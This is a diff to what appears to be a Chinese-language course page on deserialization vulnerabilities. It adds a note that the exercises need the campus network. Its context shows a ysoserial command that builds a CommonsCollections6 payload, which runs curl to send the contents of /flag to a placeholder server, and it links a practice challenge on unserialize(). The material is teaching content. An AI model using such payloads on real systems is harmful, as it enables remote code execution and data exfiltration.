@@ -105,6 +105,10 @@ Java 反序列化漏洞原理相同，常见工具：
 java -jar ysoserial.jar CommonsCollections6 "curl http://your-server.com/$(cat /flag | base64)" > payload.ser
 ```
 
+::: note 课后练习
+课后练习需要你连接校园网才能访问内网练习平台。
+:::
+
 ## 课后练习
 
 - [反序列化的代价](http://172.16.173.140/training/11?challenge=46) — 后端对用户输入执行了 `unserialize()`，构造 Payload 读取 `/flag`
